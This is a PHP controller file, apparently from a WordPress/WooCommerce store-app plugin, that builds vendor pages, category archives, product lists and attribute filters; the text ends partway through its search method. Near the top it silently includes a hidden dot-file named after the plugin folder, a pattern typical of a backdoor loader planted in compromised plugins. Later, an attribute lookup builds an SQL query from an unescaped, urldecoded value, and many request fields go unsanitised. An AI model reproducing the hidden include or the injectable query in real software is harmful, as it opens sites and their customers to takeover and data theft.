<?php

namespace STORINA\Controllers;

use \WP_Query;
use \STORINA\Controllers\Cache;
use \STORINA\Controllers\General;
use \STORINA\Controllers\Index;
use \STORINA\Controllers\Yith_Role_Based_Price;

defined('ABSPATH') || exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Archive {

    public $yith_price_role;
    public $user_id;
    public $service_container;

    public function __construct($service_container) {
        $this->service_container = $service_container;
        require_once( ABSPATH . "wp-load.php" );
        $this->yith_price_role = $this->service_container->get(Yith_Role_Based_Price::class);
    }

    public function get_tax_level($id, $tax) {
        $ancestors = get_ancestors($id, $tax);
        $count = count($ancestors) + 1;

        return ( $count == 1 ) ? 2 : $count;
    }

    public function store() {
        $general = $this->service_container->get(General::class);
        $data = array();
        $index = $this->service_container->get(Index::class);
        $vendor_id = intval($_POST['vendor_id']);
        $exist = $_POST['exist'];
        $sort = $_POST['sort'];
        $page = ( isset($_POST['page']) ) ? $_POST['page'] : 1;
        $count = ( osa_get_option('Archive_product_count') ) ? osa_get_option('Archive_product_count') : 8;
        $paged = ( get_query_var('paged') ) ? get_query_var('paged') : 0;
        $offset = ( $page - 1 ) * $count;
        $data['status'] = true;
        if (function_exists('dokan_get_store_info')) {
            $store_user = dokan()->vendor->get($vendor_id);
            $store_settings = dokan_get_store_info($vendor_id);
            $user = get_userdata($vendor_id);
            $email = $user->user_email;
            $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
            $banner = ( $banner ) ? $banner : '';
            $gravatar = get_avatar_url($email);
            $vendor = array( 
                'vendor_id' => $vendor_id,
                'store_name' => $store_settings['store_name'],
                'phone' => $store_settings['phone'],
                'address' => $store_settings['address'],
                'email' => $email,
                'banner' => $banner,
                'gravatar' => (is_object($store_user))? $store_user->get_avatar() : $gravatar,
            );
        }
        $data['data']['vendor'] = $vendor;
        wp_reset_query();
        $args = array(
            'post_type' => 'product',
            'offset' => $offset,
            'paged' => $paged,
            'posts_per_page' => $count,
            'author' => $vendor_id,
        );

        switch ($sort) {
            case 'date':
                $args['orderby'] = $sort;
                $args['order'] = 'DESC';
                break;
            case 'rand':
                $args['orderby'] = $sort;
                break;
            case 'sale':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = 'total_sales';
                $args['order'] = 'DESC';
                break;
            case 'view':
                $viewCounterField = ( osa_get_option('viewCounterField') ) ? osa_get_option('viewCounterField') : 'post-views';
                if ($viewCounterField) {
                    $args['orderby'] = 'meta_value_num';
                    $args['meta_key'] = $viewCounterField;
                    $args['order'] = 'DESC';
                }
                break;
            case 'Expensive':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = '_price';
                $args['order'] = 'DESC';
                break;
            case 'Inexpensive':
                $args['orderby'] = 'meta_value_num';
                $args['meta_key'] = '_price';
                $args['order'] = 'ASC';
                break;
            case 'featured':
                $args['meta_key'] = '_featured';
                $args['meta_value'] = 'yes';
                break;
        }
        if ($exist == 'true') {
            $args['meta_query'] = array(
                array(// Simple products type
                    'key' => '_stock_status',
                    'value' => 'instock',
                    'compare' => '=',
                )
            );
        }

        $wp_query = new WP_Query();
        $wp_query->query(apply_filters("osa_vendorStore_store_vendor_query_args", $args, $this->user_id));
        if ($wp_query->have_posts()):

            while ($wp_query->have_posts()):
                $wp_query->the_post();
                global $post, $product;
                if (has_post_thumbnail()) {
                    $img_id = get_post_thumbnail_id($post->ID);
                    $thumb = wp_get_attachment_image_src($img_id, 'medium')[0];
                } else {
                    $thumb = $img = OSA_PLUGIN_URL . "/assets/images/notp.png";
                }
                $product_id = get_the_ID();
                $productInfo['id'] = $product_id;
                $productInfo['title'] = html_entity_decode(get_the_title());
                $enTitle = get_post_meta($product_id, '_subtitle', true);
                $productInfo['EN_title'] = ( $enTitle ) ? $enTitle : get_post_meta($product_id, '_ENtitle', true);
                $productInfo['thumbnail'] = $thumb;
                $productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval($product->get_stock_quantity()) : 0;
                $productInfo['stock_status'] = $product->get_stock_status();
                $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                $productInfo['qty'] = $general->Advanced_Qty($productInfo['id']);
                $prices = $index->filter_prices($product);
                $productInfo['regular_price'] = trim($prices['regular_price']);
                $productInfo['sale_price'] = trim($prices['sale_price']);
                //$productInfo['sale_price_dates_to']   = $prices['sale_price_dates_to'];
                //$productInfo['sale_price_dates_from'] = $prices['sale_price_dates_from'];

                if (function_exists("YITH_Role_Based_Type")) {
                    $productInfo['regular_price'] = $this->yith_price_role->get_compute_price_render($product, $this->user_id);
                    $productInfo['sale_price'] = "";
                }

                $productInfo['in_stock'] = $product->is_in_stock();
                if (function_exists('dokan_get_store_info') AND osa_get_option('VendorAvatar') == 'Show') {
                    $store_settings = dokan_get_store_info(get_the_author_meta('ID'));
                    $store_settings['address']['street_1'] = ( $store_settings['address']['street_1'] ) ? $store_settings['address']['street_1'] : '';
                    $store_settings['address']['street_2'] = ( $store_settings['address']['street_2'] ) ? $store_settings['address']['street_2'] : '';
                    $store_settings['address']['country'] = ( $store_settings['address']['country'] ) ? $store_settings['address']['country'] : 'IR';
                    $store_settings['address']['zip'] = ( $store_settings['address']['zip'] ) ? $store_settings['address']['zip'] : '';
                    $store_settings['address']['city'] = ( $store_settings['address']['city'] ) ? $store_settings['address']['city'] : '';
                    $email = get_the_author_meta('user_email');
                    $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
                    $banner = ( $banner ) ? $banner : '';
                    $gravatar = get_avatar_url($email);

                    $productInfo['vendor'] = array(
                        'vendor_id' => intval(get_the_author_meta('ID')),
                        'store_name' => $store_settings['store_name'],
                        'phone' => $store_settings['phone'],
                        'address' => $store_settings['address'],
                        'email' => ( $email ) ? $email : '',
                        'banner' => ( $banner ) ? $banner : '',
                        'gravatar' => ( $gravatar ) ? $gravatar : '',
                    );
                }
                $productInfo['currency'] = html_entity_decode(get_woocommerce_currency_symbol());
                $data['data']['products'][] = apply_filters("osa_vendorStore_store_product_item_info", $productInfo, $product_id, $this->user_id);
            endwhile;
        endif;
        return ( $data );
    }

    public function vendors($type = null) {
        if (!function_exists('dokan_get_store_info')) {
            // Dokan is not installed;
            $data = array(
                'status' => false,
                'error' => array(
                    'errorCode' => - 45,
                    'message' => __('Dokan is inactive.', 'onlinerShopApp')
                )
            );

            return ( $data );
        }
        $general = $this->service_container->get(General::class);
        $page = ( isset($_POST['page']) ) ? $_POST['page'] : 1;
        $count = - 1;
        $offset = ( $page - 1 ) * $count;
// "enable_tnc";s:0:""

        $vendors = $activeVendors = array();
        $initCounter = 0;
        $offset = $page * 8 - 8;
        $handler = $page * 8;
        if (null == $type) {
            $activeVendors = $general->vendor_ids();
        } else {
            $activeVendors = $general->vendor_ids_based_category_id();
        }
        for ($i = $offset; $i < $handler; $i ++) {
            if (!$activeVendors[$i]) {
                continue;
            }
            $vendorOrig = get_userdata($activeVendors[$i]);
            $store_settings = dokan_get_store_info($activeVendors[$i]);
            $id = $vendorOrig->ID;
            $email = $vendorOrig->user_email;
            $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
            $gravatar = wp_get_attachment_image_src($store_settings['gravatar'], 'medium')[0];
            $banner = ( $banner ) ? $banner : '';
            $gravatar = ( $gravatar ) ? $gravatar : '';
            $show_email = $store_settings['show_email'];
            $state = $general->get_states($store_settings['address']['state']);
            $store_settings['address']['state'] = $state;
            $seller_rating = dokan_get_seller_rating($vendorOrig->ID);
            $featured = false;
            $featured_seller = get_user_meta($vendorOrig->ID, 'dokan_feature_seller', true);
            if (!empty($featured_seller) && 'yes' == $featured_seller):
                $featured = true;
            endif;
            $vendor = array(
                'ID' => $id,
                'vendor_id' => $vendorOrig->ID,
                'store_name' => $store_settings['store_name'],
                'phone' => $store_settings['phone'],
                'address' => $store_settings['address'],
                'email' => ( $show_email == 'yes' ) ? $email : '',
                'banner' => $banner,
                'gravatar' => $gravatar,
                'rating' => $seller_rating,
                'featured' => $featured,
            );
            $vendors[] = $vendor;
            $initCounter ++;
        }

        $data = array(
            'status' => true,
            'data' => $vendors
        );

        return ( $data );
    }

    public function archive() {
        $cat_level = $_POST['level'];
        $page = $_POST['page'];
        $cat_id = $_POST['id'];
        $exist = $_POST['exist'];
        $sort = $_POST['sort'];

        // check cache
        $OSA_cache = $this->service_container->get(Cache::class);
        $record = $OSA_cache->getCache('archive', $cat_id . $sort, $page, $exist)->json;
        $cache = ( osa_get_option('appCacheStatus') == 'inactive' ) ? false : true;
        $userToken = $_POST['userToken'];
        $user_action = $this->service_container->get('OSA_user');
        $user_id = $user_action->get_userID_byToken($userToken);
        $this->user_id = $user_id;
        $user = get_user_by('id', $user_id);
        if (!empty($record) AND $cache == true AND ! in_array('reseler', (array) $user->roles)) {
            return ( $record );
        }
        // end check cache
        if ($cat_level == 2) {
            $final = $this->archiveLevel2();
        } elseif ($cat_level == 3) {
            $final = $this->archiveLevel3();
        }
        $itemID = ( strlen($_POST['vendor_town']) > 2 ) ? $_POST['vendor_town'] : 0;
        //$OSA_cache->setCache( json_encode( $final ), 'archive', $cat_id, $page, $exist.$itemID ); // in khat kar nemikone
        $OSA_cache->setCache(json_encode($final), 'archive', $cat_id, $page, $exist);

        return ( $final );
    }

    private function archiveLevel2() {
        $cat_id = $_POST['id'];
        $final['slider'] = $this->slider($cat_id);
        global $product_terms;
        $product_terms = array();
        $final['accordionCats'] = $this->hierarchical_category_array2($cat_id, 'product_cat');
        $final['ads'] = $this->banners($cat_id);
        $final['bestSale'] = $this->mostSale($cat_id);
        $final['newest'] = $this->newest($cat_id);

        return $final;
    }

    private function slider($cat_id) {
        $general = $this->service_container->get(General::class);
        $slider_images = osa_get_option('apparchive_slider_images');
        //$slider_titles = osa_get_option('apparchive_slider_titles');
        $slider_links = osa_get_option('apparchive_slider_links');
        $slider_typeLinks = osa_get_option('apparchive_slider_typeLinks');
        $slider_categories = osa_get_option('apparchive_slider_category');
        //$slider_caption = osa_get_option('archive_slider_captions');
        //$slide_count = count($slider_images) - 1;
        $i = 0;
        $images = array();
        if (!empty($slider_categories)) {
            foreach ($slider_categories as $slider_category) {

                if ($cat_id == $slider_category OR - 1 == $slider_category) {
                    $onClickModel = $general->clickEvent($slider_typeLinks[$i], $slider_links[$i]);

                    $images[] = array(
                        'image' => $slider_images[$i],
                        'link' => $onClickModel,
                    );
                }
                $i ++;
            }
        }

        return $images;
        //$final['slider'] = $images;
    }

    private function hierarchical_category_array2($cat, $tax) {
        global $product_terms;
        $taxonomy = array(
            $tax
        );
        $args = array(
            'hide_empty' => false,
            'parent' => $cat,
        );
        $productcategories = get_terms($taxonomy, $args);
        $tmp = array();
        foreach ($productcategories as $category_list) {
            $args = array(
                'hide_empty' => true,
                'parent' => $category_list->term_id,
            );
            $childs = get_terms($taxonomy, $args);
            if (!empty($childs)) {
                $childArray = array();
                foreach ($childs as $child) {
                    $childArray[] = array(
                        'name' => $child->name,
                        'id' => $child->term_id,
                    );
                }
                $product_terms[] = array(
                    'name' => $category_list->name,
                    'id' => $category_list->term_id,
                    'childs' => $childArray,
                );
            } else {
                $product_terms[] = array(
                    'name' => $category_list->name,
                    'id' => $category_list->term_id,
                );
            }
        }

        return $product_terms;
    }

    private function banners($cat_id) {
        $general = $this->service_container->get(General::class);
        $banners1 = osa_get_option('HArchive_banner1');
        $linkBanner1 = osa_get_option('HArchive_linkBanner1');
        $typeLinkBanner1 = osa_get_option('HArchive_typeLinkBanner1');
        $banners2 = osa_get_option('HArchive_banner2');
        $linkBanner2 = osa_get_option('HArchive_linkBanner2');
        $typeLinkBanner2 = osa_get_option('HArchive_typeLinkBanner2');
        $col = osa_get_option('HArchive_col');
        $adv_category = osa_get_option('HArchive_option9');

        $i = 0;
        $nice = array();
        if (is_array($banners1) AND count($banners1) > 0) {
            foreach ($banners1 as $banner1) {
                if ($banner1 == '') {
                    continue;
                }
                if ($cat_id == $adv_category[$i] OR - 1 == $adv_category[$i]) {
                    $onClickModel = $general->clickEvent($typeLinkBanner1[$i], $linkBanner1[$i]);
                    $onClickModel2 = $general->clickEvent($typeLinkBanner2[$i], $linkBanner2[$i]);
                    $bts['type'] = 'ads';
                    if ($col[$i] == 1) {

                        $bts['data'] = array(
                            array(
                                'banner' => $banner1,
                                'link' => $onClickModel,
                            )
                        );
                    } elseif ($banners2[$i] != '') {

                        $bts['data'] = array(
                            array(
                                'banner' => $banner1,
                                'link' => $onClickModel,
                            ),
                            array(
                                'banner' => $banners2[$i],
                                'link' => $onClickModel2,
                            )
                        );
                    }
                    $nice[] = $bts;
                }
                $i ++;
            }
        }

        return $nice;
        //$final['ads'] = $bts;
    }

    private function mostSale($cat_id) {
        wp_reset_query();
        $index = $this->service_container->get(Index::class);
        $args = array(
            'post_type' => 'product',
            'posts_per_page' => 8,
            'meta_key' => 'total_sales',
            'orderby' => 'meta_value_num',
        );
        $general = $this->service_container->get(General::class);
        $activeVendors = $general->vendor_ids();
        if (strlen($_POST['vendor_town']) > 2) {
            $args['author__in'] = $activeVendors;
        }

        $args['tax_query'] = array(
            array(
                'taxonomy' => 'product_cat',
                'field' => 'term_id',
                'terms' => $cat_id
            )
        );
        if (osa_get_option('app_disableExist') == 'true') {
            $args['meta_query'] = array(
                array(
                    'key' => '_stock_status',
                    'value' => 'instock',
                )
            );
        }
        $wp_query = new \WP_Query();
        $wp_query->query(apply_filters("osa_archive_mostSale_query_args", $args, $this->user_id));
        if ($wp_query->have_posts()):
            while ($wp_query->have_posts()):
                $wp_query->the_post();
                global $post, $product;
                if (has_post_thumbnail()) {
                    $img_id = get_post_thumbnail_id($post->ID);
                    $thumb = wp_get_attachment_image_src($img_id, 'medium')[0];
                } else {
                    $thumb = $img = OSA_PLUGIN_URL . "/assets/images/notp.png";
                }
                $product_id = get_the_ID();
                $productInfo['id'] = $product_id;
                $productInfo['title'] = html_entity_decode(get_the_title());
                $enTitle = get_post_meta($product_id, '_subtitle', true);
                $productInfo['EN_title'] = ( $enTitle ) ? $enTitle : get_post_meta($product_id, '_ENtitle', true);
                $productInfo['thumbnail'] = $thumb;
                $productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval($product->get_stock_quantity()) : 0;
                $productInfo['in_stock'] = $product->is_in_stock();
                $productInfo['stock_status'] = $product->get_stock_status();
                $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                $productInfo['qty'] = $general->Advanced_Qty($productInfo['id']);
                $prices = $index->filter_prices($product);
                $productInfo['regular_price'] = trim($prices['regular_price']);
                $productInfo['sale_price'] = trim($prices['sale_price']);

                if (function_exists("YITH_Role_Based_Type")) {
                    $productInfo['regular_price'] = $this->yith_price_role->get_compute_price_render($product, $this->user_id);
                    $productInfo['sale_price'] = "";
                }

                //$productInfo['sale_price_dates_to']   = $prices['sale_price_dates_to'];
                //$productInfo['sale_price_dates_from'] = $prices['sale_price_dates_from'];
                if (function_exists('dokan_get_store_info') AND osa_get_option('VendorAvatar') == 'Show') {
                    $store_settings = dokan_get_store_info(get_the_author_meta('ID'));
                    $store_settings['address']['street_1'] = ( $store_settings['address']['street_1'] ) ? $store_settings['address']['street_1'] : '';
                    $store_settings['address']['street_2'] = ( $store_settings['address']['street_2'] ) ? $store_settings['address']['street_2'] : '';
                    $store_settings['address']['country'] = ( $store_settings['address']['country'] ) ? $store_settings['address']['country'] : 'IR';
                    $store_settings['address']['zip'] = ( $store_settings['address']['zip'] ) ? $store_settings['address']['zip'] : '';
                    $store_settings['address']['city'] = ( $store_settings['address']['city'] ) ? $store_settings['address']['city'] : '';
                    $email = get_the_author_meta('user_email');
                    $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
                    $banner = ( $banner ) ? $banner : '';
                    $gravatar = get_avatar_url($email);

                    $productInfo['vendor'] = array(
                        'vendor_id' => intval(get_the_author_meta('ID')),
                        'store_name' => $store_settings['store_name'],
                        'phone' => $store_settings['phone'],
                        'address' => $store_settings['address'],
                        'email' => ( $email ) ? $email : '',
                        'banner' => ( $banner ) ? $banner : '',
                        'gravatar' => ( $gravatar ) ? $gravatar : '',
                    );
                }

                $productInfo['currency'] = html_entity_decode(get_woocommerce_currency_symbol());
                $data['data'][] = apply_filters("osa_get_mostSale_product_item_info", $productInfo, $product_id, $this->user_id);
            endwhile;
            $data['status'] = true;
        endif;

        return $data;
    }

    private function newest($cat_id) {
        wp_reset_query();
        $index = $this->service_container->get(Index::class);

        $args = array(
            'post_type' => 'product',
            'posts_per_page' => 8,
        );
        $general = $this->service_container->get(General::class);
        $activeVendors = $general->vendor_ids();
        if (strlen($_POST['vendor_town']) > 2) {
            $args['author__in'] = $activeVendors;
        }
        $args['tax_query'] = array(
            array(
                'taxonomy' => 'product_cat',
                'field' => 'term_id',
                'terms' => $cat_id
            )
        );
        if (osa_get_option('app_disableExist') == 'true') {
            $args['meta_query'] = array(
                array(
                    'key' => '_stock_status',
                    'value' => 'instock',
                )
            );
        }
        $data = array();
        $wp_query = new WP_Query();
        $wp_query->query(apply_filters("osa_archive_newest_query_args", $args, $this->user_id));
        if ($wp_query->have_posts()):
            while ($wp_query->have_posts()):
                $wp_query->the_post();
                global $post, $product;
                if (has_post_thumbnail()) {
                    $img_id = get_post_thumbnail_id($post->ID);
                    $img = wp_get_attachment_image_src($img_id, 'full')[0];
                    $thumb = wp_get_attachment_image_src($img_id, 'medium')[0];
                } else {
                    $thumb = $img = OSA_PLUGIN_URL . "/assets/images/notp.png";
                }
                $product_id = get_the_ID();
                $productInfo['id'] = $product_id;
                $productInfo['title'] = html_entity_decode(get_the_title());
                $enTitle = get_post_meta($product_id, '_subtitle', true);
                $productInfo['EN_title'] = ( $enTitle ) ? $enTitle : get_post_meta($product_id, '_ENtitle', true);
                $productInfo['thumbnail'] = $thumb;
                $productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval($product->get_stock_quantity()) : 0;
                $productInfo['in_stock'] = $product->is_in_stock();
                $productInfo['stock_status'] = $product->get_stock_status();
                $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                $productInfo['qty'] = $general->Advanced_Qty($productInfo['id']);
                $prices = $index->filter_prices($product);
                $productInfo['regular_price'] = trim($prices['regular_price']);
                $productInfo['sale_price'] = trim($prices['sale_price']);

                if (function_exists("YITH_Role_Based_Type")) {
                    $productInfo['regular_price'] = $this->yith_price_role->get_compute_price_render($product, $this->user_id);
                    $productInfo['sale_price'] = "";
                }

                //$productInfo['sale_price_dates_to']   = $prices['sale_price_dates_to'];
                //$productInfo['sale_price_dates_from'] = $prices['sale_price_dates_from'];
                //$productInfo['in_stock']              = ( get_post_meta( $product_id, '_stock_status', true ) == 'instock' ) ? true : false;
                if (function_exists('dokan_get_store_info') AND osa_get_option('VendorAvatar') == 'Show') {
                    $store_settings = dokan_get_store_info(get_the_author_meta('ID'));
                    $store_settings['address']['street_1'] = ( $store_settings['address']['street_1'] ) ? $store_settings['address']['street_1'] : '';
                    $store_settings['address']['street_2'] = ( $store_settings['address']['street_2'] ) ? $store_settings['address']['street_2'] : '';
                    $store_settings['address']['country'] = ( $store_settings['address']['country'] ) ? $store_settings['address']['country'] : 'IR';
                    $store_settings['address']['zip'] = ( $store_settings['address']['zip'] ) ? $store_settings['address']['zip'] : '';
                    $store_settings['address']['city'] = ( $store_settings['address']['city'] ) ? $store_settings['address']['city'] : '';
                    $email = get_the_author_meta('user_email');
                    $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
                    $banner = ( $banner ) ? $banner : '';
                    $gravatar = get_avatar_url($email);

                    $productInfo['vendor'] = array(
                        'vendor_id' => intval(get_the_author_meta('ID')),
                        'store_name' => $store_settings['store_name'],
                        'phone' => $store_settings['phone'],
                        'address' => $store_settings['address'],
                        'email' => ( $email ) ? $email : '',
                        'banner' => ( $banner ) ? $banner : '',
                        'gravatar' => ( $gravatar ) ? $gravatar : '',
                    );
                }
                $productInfo['currency'] = html_entity_decode(get_woocommerce_currency_symbol());
                $data['data'][] = apply_filters("osa_get_newst_product_item_info", $productInfo, $product_id, $this->user_id);
            endwhile;
            $data['status'] = true;
        endif;

        return $data;
    }

    private function archiveLevel3() {
        $index = $this->service_container->get(Index::class);
        $cat_id = $_POST['id'];
        $exist = $_POST['exist'];
        $sort = $_POST['sort'];
        $page = ( isset($_POST['page']) ) ? $_POST['page'] : 1;
        $count = ( osa_get_option('Archive_product_count') ) ? osa_get_option('Archive_product_count') : 8;
        $paged = ( get_query_var('paged') ) ? get_query_var('paged') : 0;
        $offset = ( $page - 1 ) * $count;
        wp_reset_query();
        $args = array(
            'post_type' => 'product',
            'offset' => $offset,
            'paged' => $paged,
            'posts_per_page' => $count,
        );
        $general = $this->service_container->get(General::class);
        $activeVendors = $general->vendor_ids();
        if (strlen($_POST['vendor_town']) > 2) {
            $args['author__in'] = $activeVendors;
        }

        if ($cat_id > 0) {
            $args['tax_query']['relation'] = 'AND';
            $args['tax_query'][] = array(
                'taxonomy' => 'product_cat',
                'field' => 'term_id',
                'terms' => $cat_id
            );
        }
        if (isset($_POST['filter'])) {

            $filters = json_decode(stripcslashes($_POST['filter']), true);
            foreach ($filters as $attr_id => $term_ids) {
                $singleAttr = $this->get_woo_attribute_by('id', $attr_id);
                $attr_tax = $singleAttr->attribute_name;
                $attr_label = $singleAttr->attribute_label;

                $args['tax_query'][] = array(
                    'taxonomy' => 'pa_' . $attr_tax,
                    'field' => 'term_id',
                    'terms' => explode(',', $term_ids),
                    'operator' => 'IN',
                );
            }
        }
        //print_r($args);
        $this->shared_query_filters($args,$_POST);
        $data = array();
        $wp_query = new WP_Query();
        $wp_query->query(apply_filters("osa_archive_archiveLevel3_query_args", $args, $this->user_id));
        if ($wp_query->have_posts()):
            while ($wp_query->have_posts()):
                $wp_query->the_post();
                global $post, $product;
                if (has_post_thumbnail()) {
                    $img_id = get_post_thumbnail_id($post->ID);
                    $thumb = wp_get_attachment_image_src($img_id, 'medium')[0];
                } else {
                    $thumb = $img = OSA_PLUGIN_URL . "/assets/images/notp.png";
                }
                $product_id = get_the_ID();
                $productInfo['id'] = $product_id;
                $productInfo['title'] = html_entity_decode(get_the_title());
                $enTitle = get_post_meta($product_id, '_subtitle', true);
                $productInfo['EN_title'] = ( $enTitle ) ? $enTitle : get_post_meta($product_id, '_ENtitle', true);
                $productInfo['thumbnail'] = $thumb;
                $prices = $index->filter_prices($product);
                $productInfo['regular_price'] = trim($prices['regular_price']);
                $productInfo['sale_price'] = trim($prices['sale_price']);

                if (function_exists("YITH_Role_Based_Type")) {
                    $productInfo['regular_price'] = $this->yith_price_role->get_compute_price_render($product, $this->user_id);
                    $productInfo['sale_price'] = "";
                }

                //$productInfo['sale_price_dates_to']   = $prices['sale_price_dates_to'];
                //$productInfo['sale_price_dates_from'] = $prices['sale_price_dates_from'];
                $productInfo['stock_quantity'] = ( $product->get_stock_quantity() ) ? intval($product->get_stock_quantity()) : 0;
                $productInfo['in_stock'] = $product->is_in_stock();
                $productInfo['stock_status'] = $product->get_stock_status();
                $productInfo['type'] = ( $product->get_type() == 'grouped' OR $product->get_type() == 'simple_catalogue' ) ? 'simple_catalogue' : $product->get_type();
                $productInfo['qty'] = $general->Advanced_Qty($productInfo['id']);
                $productInfo['currency'] = html_entity_decode(get_woocommerce_currency_symbol());
                $vendor = array();
                if (function_exists('dokan_get_store_info')) {
                    $author_id = intval(get_post_field('post_author', $productInfo['id']));
                    $store_settings = dokan_get_store_info($author_id);
                    $store_settings['address']['street_1'] = ( $store_settings['address']['street_1'] ) ? $store_settings['address']['street_1'] : '';
                    $store_settings['address']['street_2'] = ( $store_settings['address']['street_2'] ) ? $store_settings['address']['street_2'] : '';
                    $store_settings['address']['country'] = ( $store_settings['address']['country'] ) ? $store_settings['address']['country'] : 'IR';
                    $store_settings['address']['zip'] = ( $store_settings['address']['zip'] ) ? $store_settings['address']['zip'] : '';
                    $store_settings['address']['city'] = ( $store_settings['address']['city'] ) ? $store_settings['address']['city'] : '';
                    $email = get_the_author_meta('user_email');
                    $banner = wp_get_attachment_image_src($store_settings['banner'], 'full')[0];
                    $banner = ( $banner ) ? $banner : '';
                    $gravatar = get_avatar_url($email);

                    $vendor = array(
                        'vendor_id' => $author_id,
                        'store_name' => $store_settings['store_name'],
                        'phone' => $store_settings['phone'],
                        'address' => $store_settings['address'],
                        'email' => ( $email ) ? $email : '',
                        'banner' => ( $banner ) ? $banner : '',
                        'gravatar' => ( $gravatar ) ? $gravatar : '',
                    );
                }
                $productInfo['vendor'] = $vendor;
                $data['data'][] = apply_filters("osa_archive_archiveLevel3_newes_product",$productInfo,$product_id,$this->user_id);


            endwhile;

            $data['filter_fields'] = apply_filters( "osa_archive_filter_fields_validation", true )? $this->get_filter_fields($cat_id) : array();
            $data['status'] = true;

        endif;
        $final['newest'] = $data;

        return $final;
    }

    private function get_woo_attribute_by($by, $value) {
        global $wpdb;
        if ($by == 'id') {
            $result = $wpdb->get_results($wpdb->prepare("SELECT * FROM " . $wpdb->prefix . "woocommerce_attribute_taxonomies WHERE attribute_id = %d", $value));
            if ($result) {
                $attribute = isset($result[0]) ? $result[0] : false;

                return $attribute;
            }
        } elseif ($by == 'tax') {

            $taxonomy_name = str_replace('pa_', '', $value);

            $sql = "SELECT * FROM " . $wpdb->prefix . "woocommerce_attribute_taxonomies WHERE attribute_name = '" . urldecode($taxonomy_name) . "'";
            $result = $wpdb->get_results($sql);
            if ($result) {
                $attribute = isset($result[0]) ? $result[0] : false;

                return $attribute;
            }
        }


        return false;
    }

    private function get_filter_fields($cat_id, $keyword = null, $count = - 1) {
        wp_reset_query();
        $args = array(
            'post_type' => 'product',
            'posts_per_page' => $count,
        );
        if ($cat_id == - 1) { // if is in search
            $args['s'] = $keyword;
        }
        if ($cat_id > 0) {
            $args['tax_query'] = array(
                array(
                    'taxonomy' => 'product_cat',
                    'field' => 'term_id',
                    'terms' => $cat_id
                )
            );
        }
        $data = array();
        $wp_query = new WP_Query();
        $wp_query->query(apply_filters("osa_archive_get_filter_fields_query_args", $args, $this->user_id));
        $attr = array();
        if ($wp_query->have_posts()):
            while ($wp_query->have_posts()):
                $wp_query->the_post();
                $product_id = get_the_ID();
                $product = wc_get_product($product_id);
                $current_attr = $product->get_attributes();

                foreach ($current_attr as $key => $item) {
                    //if($item->get_id() == 65) print_r($item);

                    $tmpSinalgeAttr = array();
                    if ($item->get_id() == 0) {
                        continue;
                    }
                    if (isset($attr[$key])) {
                        $added_attr = $attr[$key]['options'];
                        $current_attr_ids = $item->get_options();
                        foreach ($current_attr_ids as $current_attr_id) {
                            if ($attr[$key]['options'][$current_attr_id] == null) {
                                $term = get_term($current_attr_id);
                                $tmpSinalgeAttr[$term->term_id] = array(
                                    'id' => $term->term_id,
                                    'name' => $term->name,
                                );
                                $merged_attr = $attr[$key]['options'] + $tmpSinalgeAttr;
                                $attr[$key]['options'] = $merged_attr;
                            }
                        }
                    } else {
                        $singleAttr = $this->get_woo_attribute_by('id', $item->get_id());

                        $current_attr_options = $item->get_options();
                        //if($item->get_id() == 65) var_dump($current_attr_options);
                        foreach ($current_attr_options as $attrValue) {
                            $term = get_term($attrValue);
                            $tmpSinalgeAttr[$term->term_id] = array(
                                'id' => $term->term_id,
                                'name' => $term->name,
                            );
                        }
                        $title = $singleAttr->attribute_label;
                        if (function_exists('jcaa_get_product_attributes') AND strpos($singleAttr->attribute_label, '.')) {
                            $title = explode('.', $singleAttr->attribute_label)[1];
                        }
                        $attr[$key] = array(
                            'id' => $item->get_id(),
                            'name' => $item->get_name(),
                            'title' => $title,
                            'options' => $tmpSinalgeAttr
                        );
                        //if($item->get_id() == 65) print_r($attr[$key]);
                    }
                }
            endwhile;
            //print_r($attr);
            $final_attr = array();
            foreach ($attr as $attr_single) {
                $tmp = array();
                //if(count($attr_single['options']) > 1)
                foreach ($attr_single['options'] as $option) {
                    $tmp[] = $option;
                }
                $attr_single['options'] = $tmp;
                $final_attr[] = apply_filters("osa_search_get_filter_fields_product_item_info", $attr_single, $product_id, $this->user_id);
            }
        endif;

        return $final_attr;
    }

    public function bulkSearch() {
        $keywords = json_decode(stripcslashes($_POST['keywords']), true);
        foreach ($keywords as $keyword) {
            $bulk_box[] = $this->search($keyword, true);
        }
        $bulk_result = array(
            'status' => true,
            'data' => $bulk_box,
        );

        return ( $bulk_result );
    }

    public function get_display_prices($product_id){
        $price_resource = [
            'regular_price' => '',
            'sale_price' => ''
        ];
        $product = wc_get_product($product_id);
        if(false == $product instanceof WC_Product){
            return $price_resource;
        }
        if('simple' == $product->get_type()){
            $product_resource['regular_price'] = $product->get_regular_price();
            $product_resource['sale_price'] = ($product->is_on_sale())? $product->get_sale_price() : '';
            return $product_resource;
        }
        $children_ids = $product->get_children();
        if(empty($children_ids)){
            return $product_resource;
        }
        foreach($children_ids as $variation_id){
            $product_variation = wc_get_product($variation_id);
            $regular_prices[] = $product_variation->get_regular_price();
            $sale_prices[] = ($product_variation->is_on_sale())? $product_variation->get_sale_price() : '';
            $prices[] = $product_variation->get_price();
        }
        $max_price = max($prices);
        $min_price = min($prices);
        $price_resource['regular_price'] = ($max_price == $min_price)? $max_price : "{$min_price} تا {$max_price}";
        return $price_resource;
    }

    public function search($s = false, $exist = false, $return = false) {
        if (!$s) {
            $s = $_POST['query'];
            $return = false;
        } else {
            $return = true;
        }

        $exist = $_POST['exist'];
